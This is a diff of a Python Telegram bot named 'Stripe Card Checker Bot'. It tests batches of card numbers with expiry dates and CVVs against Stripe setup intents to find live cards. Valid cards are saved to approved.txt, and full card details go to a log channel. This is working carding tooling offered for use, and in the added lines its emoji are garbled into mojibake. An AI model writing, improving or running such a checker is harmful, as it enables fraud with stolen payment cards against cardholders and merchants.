@@ -42,37 +42,16 @@ if not LOG_CHANNEL_ID:
 app = None
 file_lock = threading.Lock()
 
-# NEW FUNCTION: Function to chunk large messages for Telegram's limits
-def chunk_message(message, max_length=4000):
-    if len(message) <= max_length:
-        return [message]
-
-    chunks = []
-    while message:
-        if len(message) <= max_length:
-            chunks.append(message)
-            break
-
-        # Find a good breaking point
-        split_point = message.rfind('\n', 0, max_length)
-        if split_point == -1:
-            split_point = max_length
-
-        chunks.append(message[:split_point])
-        message = message[split_point:].lstrip()
-
-    return chunks
-
 # Log channel functionality
 async def log_to_channel(message: str, bot: Bot = None):
     """Send log message to the designated log channel"""
     if not LOG_CHANNEL_ID or not bot:
         return
-
+    
     try:
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        formatted_message = f"🕐 {timestamp}\n{message}"
-
+        formatted_message = f"ðŸ• {timestamp}\n{message}"
+        
         await bot.send_message(
             chat_id=LOG_CHANNEL_ID,
             text=formatted_message,
@@ -85,20 +64,20 @@ async def log_user_interaction(update: Update, action: str, details: str = ""):
     """Log user interactions to the channel"""
     if not LOG_CHANNEL_ID:
         return
-
+    
     user = update.effective_user
     chat = update.effective_chat
-
+    
     log_message = f"""
-📊 **USER INTERACTION LOG**
+ðŸ“Š **USER INTERACTION LOG**
 
-👤 **User:** {user.full_name} (@{user.username or 'No username'})
-🆔 **User ID:** `{user.id}`
-💬 **Chat:** {chat.title or 'Private Chat'} (`{chat.id}`)
-🎯 **Action:** {action}
-📝 **Details:** {details}
+ðŸ‘¤ **User:** {user.full_name} (@{user.username or 'No username'})
+ðŸ†” **User ID:** `{user.id}`
+ðŸ’¬ **Chat:** {chat.title or 'Private Chat'} (`{chat.id}`)
+ðŸŽ¯ **Action:** {action}
+ðŸ“ **Details:** {details}
     """
-
+    
     try:
         bot = update.get_bot()
         await log_to_channel(log_message, bot)
@@ -109,74 +88,43 @@ async def log_card_processing(card_data: str, result: dict, user_info: dict, bot
     """Log card processing results to the channel"""
     if not LOG_CHANNEL_ID:
         return
-
+    
     status_emoji = {
-        'APPROVED': '✅',
-        'DECLINED': '❌',
-        'ERROR': '⚠️',
-        'UNKNOWN': '❓'
+        'APPROVED': 'âœ…',
+        'DECLINED': 'âŒ',
+        'ERROR': 'âš ï¸',
+        'UNKNOWN': 'â“'
     }
-
-    emoji = status_emoji.get(result['status'], '❓')
-
+    
+    emoji = status_emoji.get(result['status'], 'â“')
+    
     log_message = f"""
-💳 **CARD PROCESSING LOG**
+ðŸ’³ **CARD PROCESSING LOG**
 
-👤 **User:** {user_info.get('name', 'Unknown')} (@{user_info.get('username', 'No username')})
-🆔 **User ID:** `{user_info.get('id', 'Unknown')}`
-💳 **Card:** `{card_data}`
+ðŸ‘¤ **User:** {user_info.get('name', 'Unknown')} (@{user_info.get('username', 'No username')})
+ðŸ†” **User ID:** `{user_info.get('id', 'Unknown')}`
+ðŸ’³ **Card:** `{card_data}`
 {emoji} **Result:** {result['status']}
-📝 **Message:** {result.get('message', 'No message')}
-⏱️ **Processing Time:** {result.get('time', 'Unknown')}s
+ðŸ“ **Message:** {result.get('message', 'No message')}
+â±ï¸ **Processing Time:** {result.get('time', 'Unknown')}s
     """
-
+    
     await log_to_channel(log_message, bot)
 
 async def log_system_event(event_type: str, details: str, bot: Bot = None):
     """Log system events to the channel"""
     if not LOG_CHANNEL_ID:
         return
-
+    
     log_message = f"""
-🔧 **SYSTEM EVENT LOG**
+ðŸ”§ **SYSTEM EVENT LOG**
 
-📋 **Event Type:** {event_type}
-📝 **Details:** {details}
+ðŸ“‹ **Event Type:** {event_type}
+ðŸ“ **Details:** {details}
     """
-
+    
     if bot:
         await log_to_channel(log_message, bot)
-
-# NEW FUNCTION: Log detailed results of mass checks
-async def log_mass_check_results(approved_cards, declined_cards, error_cards, user_info, bot):
-    """Log the results of a mass check operation to the log channel"""
-
-    # Log approved cards
-    if approved_cards:
-        approved_text = "✅ **APPROVED CARDS:**\n\n"
-        for card, result in approved_cards:
-            approved_text += f"💳 `{card}`\n✅ **APPROVED** - {result['message']}\n⏱️ Time: {result['time']}s\n\n"
-
-        for chunk in chunk_message(approved_text):
-            await log_to_channel(chunk, bot)
-
-    # Log declined cards
-    if declined_cards:
-        declined_text = "❌ **DECLINED CARDS:**\n\n"
-        for card, result in declined_cards:
-            declined_text += f"💳 `{card}`\n❌ **DECLINED** - {result['message']}\n⏱️ Time: {result['time']}s\n\n"
-
-        for chunk in chunk_message(declined_text):
-            await log_to_channel(chunk, bot)
-
-    # Log error cards
-    if error_cards:
-        error_text = "⚠️ **ERROR CARDS:**\n\n"
-        for card, result in error_cards:
-            error_text += f"💳 `{card}`\n⚠️ **ERROR** - {result['message']}\n⏱️ Time: {result['time']}s\n\n"
-
-        for chunk in chunk_message(error_text):
-            await log_to_channel(chunk, bot)
 
 def extract_nonce(response_text, url):
     soup = BeautifulSoup(response_text, 'html.parser')
@@ -303,173 +251,438 @@ def process_cc(ccc):
             timer = round(time.time() - start_time, 1)
             return {
                 'status': 'DECLINED',
-                'message': "Payment method creation failed",
+                'message': f"ðŸ’³ {cc}|{m}|{y}|{cvv}\nâŒ **DECLINED** - Payment method creation failed\nâ±ï¸ Time: {timer}s",
                 'card': ccc,
                 'time': timer
             }
 
         result = create_setup_intent(payment_method_id, cc)
-        if not result:
-            timer = round(time.time() - start_time, 1)
-            return {
-                'status': 'DECLINED',
-                'message': "Setup intent creation failed",
-                'card': ccc,
-                'time': timer
-            }
-
-        # Check for approval or specific errors
-        if result.get('success') and 'setup_intent' in result:
-            setup_intent = result['setup_intent']
-            if setup_intent.get('status') == 'succeeded':
-                timer = round(time.time() - start_time, 1)
-                return {
-                    'status': 'APPROVED',
-                    'message': "Card successfully verified",
-                    'card': ccc,
-                    'time': timer
-                }
-            elif 'last_setup_error' in setup_intent and setup_intent['last_setup_error']:
-                error_message = setup_intent['last_setup_error'].get('message', 'Unknown error')
-                timer = round(time.time() - start_time, 1)
-                return {
-                    'status': 'DECLINED',
-                    'message': error_message,
-                    'card': ccc,
-                    'time': timer
-                }
-
-        # Default decline if no specific condition met
         timer = round(time.time() - start_time, 1)
+
+        if result is None:
+            status = 'ERROR'
+            emoji = 'âš ï¸'
+            message = 'Setup intent failed'
+            filename = 'error.txt'
+        elif result.get("success"):
+            status = 'APPROVED'
+            emoji = 'âœ…'
+            message = 'Approved'
+            filename = 'approved.txt'
+        elif "data" in result and "error" in result["data"]:
+            status = 'DECLINED'
+            emoji = 'âŒ'
+            message = result['data']['error']['message']
+            filename = 'dead.txt'
+        else:
+            status = 'UNKNOWN'
+            emoji = 'â“'
+            message = 'Unknown response'
+            filename = 'unknown.txt'
+
+        try:
+            with file_lock:
+                with open(filename, "a") as f:
+                    f.write(f"{cc}|{m}|{y}|{cvv} - {message}\n")
+        except Exception as e:
+            logger.error(f"File write error: {e}")
+
         return {
-            'status': 'DECLINED',
-            'message': "General processing failure",
+            'status': status,
+            'message': f"ðŸ’³ {cc}|{m}|{y}|{cvv}\n{emoji} **{status}** - {message}\nâ±ï¸ Time: {timer}s",
             'card': ccc,
             'time': timer
         }
 
     except Exception as e:
         timer = round(time.time() - start_time, 1)
+        logger.error(f"Card processing error: {e}")
         return {
             'status': 'ERROR',
-            'message': str(e),
+            'message': f"ðŸ’³ {ccc}\nâš ï¸ **ERROR** - Processing error\nâ±ï¸ Time: {timer}s",
             'card': ccc,
             'time': timer
         }
 
-# MODIFY YOUR EXISTING /mass COMMAND HANDLER TO INCLUDE THIS CODE:
-async def cmd_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Process multiple cards at once"""
-    user = update.effective_user
+def process_card_thread(card_data):
+    return process_cc(card_data.strip())
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # Log user interaction
+    await log_user_interaction(update, "START_COMMAND", "User started the bot")
+    
+    welcome_message = """
+ðŸ¤– **Stripe Card Checker Bot**
+
+Commands:
+/start - Show this help message
+/chk <card> - Check a single card
+/mass <cards> - Check multiple cards using threading
+/stats - Show processing statistics
+
+Send me a card in the format: 1234567890123456|12|25|123
+    """
+    await update.message.reply_text(welcome_message, parse_mode='Markdown')
+
+async def check_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.args:
+        await log_user_interaction(update, "CHK_COMMAND_ERROR", "No card provided")
+        await update.message.reply_text("âŒ Please provide a card in format: /chk 1234567890123456|12|25|123")
+        return
+
+    card_data = " ".join(context.args)
+    dados = card_data.split("|")
+
+    if len(dados) != 4:
+        await log_user_interaction(update, "CHK_COMMAND_ERROR", f"Invalid format: {card_data}")
+        await update.message.reply_text("âŒ Invalid format. Use: 1234567890123456|12|25|123")
+        return
+
+    await log_user_interaction(update, "CHK_COMMAND", f"Checking single card: {card_data}")
+    
+    processing_msg = await update.message.reply_text("ðŸ”„ Processing card...")
+
+    result = process_cc(card_data)
+    
+    # Log card processing result
     user_info = {
-        'id': user.id,
-        'name': user.full_name,
-        'username': user.username
+        'name': update.effective_user.full_name,
+        'username': update.effective_user.username,
+        'id': update.effective_user.id
+    }
+    await log_card_processing(card_data, result, user_info, update.get_bot())
+
+    await update.message.reply_text(result['message'], parse_mode='Markdown')
+
+    try:
+        await processing_msg.delete()
+    except Exception as e:
+        logger.error(f"Failed to delete processing message: {e}")
+
+async def mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    message_text = update.message.text
+
+    if message_text.startswith('/mass'):
+        cards_text = message_text[5:].strip()
+    else:
+        await update.message.reply_text("âŒ Invalid mass command format.")
+        return
+
+    if not cards_text:
+        await update.message.reply_text("âŒ Please provide cards after /mass command.")
+        return
+
+    card_lines = [line.strip() for line in cards_text.split('\n') if line.strip()]
+
+    if not card_lines:
+        await update.message.reply_text("âŒ No valid card data found.")
+        return
+
+    await log_user_interaction(update, "MASS_COMMAND", f"Processing {len(card_lines)} cards")
+    
+    processing_msg = await update.message.reply_text(f"ðŸš€ Processing {len(card_lines)} cards with threading...")
+
+    start_time = time.time()
+
+    max_workers = min(len(card_lines), 5)
+    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        future_to_card = {
+            executor.submit(process_card_thread, card): card 
+            for card in card_lines
+        }
+
+        results = []
+        user_info = {
+            'name': update.effective_user.full_name,
+            'username': update.effective_user.username,
+            'id': update.effective_user.id
+        }
+        
+        for future in concurrent.futures.as_completed(future_to_card):
+            card = future_to_card[future]
+            try:
+                result = future.result()
+                results.append(result)
+                # Log each card processing result
+                await log_card_processing(card, result, user_info, update.get_bot())
+            except Exception as exc:
+                logger.error(f'Card {card} generated an exception: {exc}')
+                error_result = {
+                    'status': 'ERROR',
+                    'message': f"âŒ Error processing: {card.strip()}",
+                    'card': card.strip(),
+                    'time': 0
+                }
+                results.append(error_result)
+                await log_card_processing(card, error_result, user_info, update.get_bot())
+
+    try:
+        await processing_msg.delete()
+    except Exception as e:
+        logger.error(f"Failed to delete processing message: {e}")
+
+    total_time = round(time.time() - start_time, 1)
+
+    approved = declined = errors = unknown = invalid = 0
+
+    for result in results:
+        await update.message.reply_text(result['message'], parse_mode='Markdown')
+
+        if result['status'] == 'APPROVED':
+            approved += 1
+        elif result['status'] == 'DECLINED':
+            declined += 1
+        elif result['status'] == 'ERROR':
+            errors += 1
+        elif result['status'] == 'INVALID':
+            invalid += 1
+        else:
+            unknown += 1
+
+    summary = f"""
+âš¡ **Mass Check Complete**
+
+âœ… Approved: {approved}
+âŒ Declined: {declined}
+âš ï¸ Errors: {errors}
+â“ Unknown: {unknown}
+ðŸš« Invalid: {invalid}
+
+Total processed: {len(card_lines)}
+â±ï¸ Total time: {total_time}s
+ðŸš€ Threading used: {max_workers} workers
+    """
+    await update.message.reply_text(summary, parse_mode='Markdown')
+    
+    # Log mass check completion
+    await log_system_event(
+        "MASS_CHECK_COMPLETE", 
+        f"User {update.effective_user.full_name} completed mass check: {approved} approved, {declined} declined, {errors} errors",
+        update.get_bot()
+    )
+
+async def bulk_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await log_user_interaction(update, "BULK_COMMAND", "Started bulk processing from db.txt")
+    
+    caminho = os.path.join(os.path.dirname(__file__), "db.txt")
+
+    if not os.path.exists(caminho):
+        await update.message.reply_text("âŒ File 'db.txt' not found.")
+        return
+
+    try:
+        with open(caminho, "r") as file:
+            linhas = file.readlines()
+    except Exception as e:
+        await update.message.reply_text(f"âŒ Error reading db.txt: {e}")
+        return
+
+    if not linhas:
+        await update.message.reply_text("âŒ db.txt is empty.")
+        return
+
+    processing_msg = await update.message.reply_text(f"ðŸ”„ Processing {len(linhas)} cards...")
+
+    approved = declined = errors = unknown = 0
+    user_info = {
+        'name': update.effective_user.full_name,
+        'username': update.effective_user.username,
+        'id': update.effective_user.id
     }
 
-    # Check if the user provided cards
-    if not update.message.reply_to_message:
-        await update.message.reply_text("Please reply to a message containing cards.")
-        return
-
-    # Get cards from replied message
-    cards_text = update.message.reply_to_message.text
-
-    # Split into individual cards
-    cards = [card.strip() for card in cards_text.split('\n') if card.strip()]
-
-    if not cards:
-        await update.message.reply_text("No valid cards found.")
-        return
-
-    # Inform user that processing has started
-    processing_msg = await update.message.reply_text(f"Processing {len(cards)} cards. Please wait...")
-
-    # Log user interaction
-    await log_user_interaction(update, "Mass Check", f"Submitted {len(cards)} cards for checking")
-
-    # NEW CODE: Initialize lists to store results by category
-    approved_cards = []
-    declined_cards = []
-    error_cards = []
-
-    # Process each card
-    for card in cards:
-        card = card.strip()
-        if not card or '|' not in card:
+    for linha in linhas[:]:
+        if not linha.strip():
             continue
 
+        dados = linha.strip().split("|")
+        if len(dados) != 4:
+            await update.message.reply_text(f"âŒ Invalid format: {linha.strip()}")
+            continue
+
+        result = process_cc(linha.strip())
+        
+        # Log card processing result
+        await log_card_processing(linha.strip(), result, user_info, update.get_bot())
+
+        if result['status'] == 'APPROVED':
+            approved += 1
+        elif result['status'] == 'DECLINED':
+            declined += 1
+        elif result['status'] == 'ERROR':
+            errors += 1
+        else:
+            unknown += 1
+
+        await update.message.reply_text(result['message'], parse_mode='Markdown')
+
+        linhas.remove(linha)
         try:
-            result = process_cc(card)
-
-            # NEW CODE: Collect cards by category
-            if result['status'] == 'APPROVED':
-                approved_cards.append((card, result))
-            elif result['status'] == 'DECLINED':
-                declined_cards.append((card, result))
-            else:
-                error_cards.append((card, result))
-
+            with open(caminho, "w") as f:
+                f.writelines(linhas)
         except Exception as e:
-            logger.error(f"Error processing card {card}: {str(e)}")
-            error_cards.append((card, {
-                'status': 'ERROR',
-                'message': str(e),
-                'card': card,
-                'time': 0.0
-            }))
+            logger.error(f"Error updating db.txt: {e}")
 
-    # NEW CODE: Log detailed results to the log channel
-    await log_mass_check_results(
-        approved_cards,
-        declined_cards,
-        error_cards,
-        user_info,
-        context.bot
+        await asyncio.sleep(2)
+
+    try:
+        await processing_msg.delete()
+    except Exception as e:
+        logger.error(f"Failed to delete processing message: {e}")
+
+    summary = f"""
+ðŸ“Š **Processing Complete**
+
+âœ… Approved: {approved}
+âŒ Declined: {declined}
+âš ï¸ Errors: {errors}
+â“ Unknown: {unknown}
+
+Total processed: {approved + declined + errors + unknown}
+    """
+    await update.message.reply_text(summary, parse_mode='Markdown')
+    
+    # Log bulk check completion
+    await log_system_event(
+        "BULK_CHECK_COMPLETE", 
+        f"User {update.effective_user.full_name} completed bulk check: {approved} approved, {declined} declined, {errors} errors",
+        update.get_bot()
     )
 
-    # Log the summary
-    summary = f"User {user.full_name} completed mass check: {len(approved_cards)} approved, {len(declined_cards)} declined, {len(error_cards)} errors"
-    await log_system_event("MASSCHECKCOMPLETE", summary, context.bot)
+async def handle_card_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = update.message.text
+    dados = text.split("|")
 
-    # Update the user with a summary
-    await processing_msg.edit_text(
-        f"Mass check completed:\n"
-        f"✅ Approved: {len(approved_cards)}\n"
-        f"❌ Declined: {len(declined_cards)}\n"
-        f"⚠️ Errors: {len(error_cards)}"
-    )
+    if len(dados) == 4:
+        await log_user_interaction(update, "DIRECT_CARD_INPUT", f"Processing card: {text}")
+        
+        processing_msg = await update.message.reply_text("ðŸ”„ Processing card...")
 
-# Keep your existing initialization and app setup code unchanged
+        result = process_cc(text)
+        
+        # Log card processing result
+        user_info = {
+            'name': update.effective_user.full_name,
+            'username': update.effective_user.username,
+            'id': update.effective_user.id
+        }
+        await log_card_processing(text, result, user_info, update.get_bot())
 
-# Initialize and run the bot
-async def main():
-    global app
-    app = Application.builder().token(BOT_TOKEN).build()
+        await update.message.reply_text(result['message'], parse_mode='Markdown')
 
-    # Command handlers
-    app.add_handler(CommandHandler("mass", cmd_mass))
+        try:
+            await processing_msg.delete()
+        except Exception as e:
+            logger.error(f"Failed to delete processing message: {e}")
+    else:
+        await log_user_interaction(update, "INVALID_CARD_FORMAT", f"Invalid format: {text}")
+        await update.message.reply_text("âŒ Invalid format. Use: 1234567890123456|12|25|123")
 
-    # Add other command handlers as needed...
+async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await log_user_interaction(update, "STATS_COMMAND", "Requested statistics")
+    
+    files = ['approved.txt', 'dead.txt', 'error.txt', 'unknown.txt']
+    stats_text = "ðŸ“Š **Statistics**\n\n"
 
-    # Start the bot
-    await app.initialize()
-    await app.start()
-    await app.updater.start_polling()
+    for filename in files:
+        try:
+            if os.path.exists(filename):
+                with open(filename, 'r') as f:
+                    count = len(f.readlines())
+                stats_text += f"{filename}: {count} cards\n"
+            else:
+                stats_text += f"{filename}: 0 cards\n"
+        except Exception as e:
+            logger.error(f"Error reading {filename}: {e}")
+            stats_text += f"{filename}: Error reading file\n"
 
-    # Run the bot until user interrupts
-    await app.idle()
+    await update.message.reply_text(stats_text, parse_mode='Markdown')
 
-# Graceful shutdown handler
-def signal_handler(sig, frame):
-    logger.info("Received signal to terminate. Shutting down gracefully...")
+async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
+    logger.error(f"Exception while handling an update: {context.error}")
+    
+    # Log error to channel if possible
+    if hasattr(context, 'bot') and context.bot:
+        await log_system_event(
+            "BOT_ERROR", 
+            f"Error occurred: {context.error}",
+            context.bot
+        )
+
+def signal_handler(signum, frame):
+    logger.info(f"Received signal {signum}. Shutting down gracefully...")
     if app:
-        asyncio.run(app.stop())
+        try:
+            loop = asyncio.get_event_loop()
+            if not loop.is_closed():
+                loop.create_task(app.stop())
+                loop.create_task(app.shutdown())
+        except Exception as e:
+            logger.error(f"Error during shutdown: {e}")
     sys.exit(0)
 
-# Register signal handlers
-signal.signal(signal.SIGINT, signal_handler)
-signal.signal(signal.SIGTERM, signal_handler)
+def main():
+    global app
 
-if __name__ == "__main__":
-    asyncio.run(main())
+    logger.info("Starting Stripe Card Checker Bot...")
+
+    # Set up signal handlers for graceful shutdown
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
+
+    try:
+        # Create the Application
+        app = Application.builder().token(BOT_TOKEN).build()
+
+        # Add command handlers
+        app.add_handler(CommandHandler("start", start))
+        app.add_handler(CommandHandler("chk", check_single_card))
+        app.add_handler(CommandHandler("mass", mass_check))
+        #app.add_handler(CommandHandler("bulk", bulk_check))
+        app.add_handler(CommandHandler("stats", stats))
+
+        # Add message handler for direct card input
+        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_card_message))
+
+        # Add error handler
+        app.add_error_handler(error_handler)
+
+        # Log bot startup
+        if LOG_CHANNEL_ID:
+            async def startup_log():
+                await log_system_event("BOT_STARTUP", "Stripe Card Checker Bot started successfully", app.bot)
+            
+            # Schedule startup log
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            loop.run_until_complete(startup_log())
+
+        # Start the bot with polling
+        logger.info("Bot started with polling...")
+
+        # Check if there's already a running event loop
+        try:
+            loop = asyncio.get_running_loop()
+            # If we get here, there's already a running loop
+            # Create a task in the existing loop
+            loop.create_task(app.run_polling(
+                allowed_updates=Update.ALL_TYPES,
+                drop_pending_updates=True,
+                close_loop=False
+            ))
+            # Keep the main thread alive
+            while True:
+                time.sleep(1)
+        except RuntimeError:
+            # No running loop, we can use asyncio.run()
+            asyncio.run(app.run_polling(
+                allowed_updates=Update.ALL_TYPES,
+                drop_pending_updates=True,
+                close_loop=False
+            ))
+
+    except Exception as e:
+        logger.error(f"Error starting bot: {e}")
+        sys.exit(1)
+
+if __name__ == '__main__':
+    main()
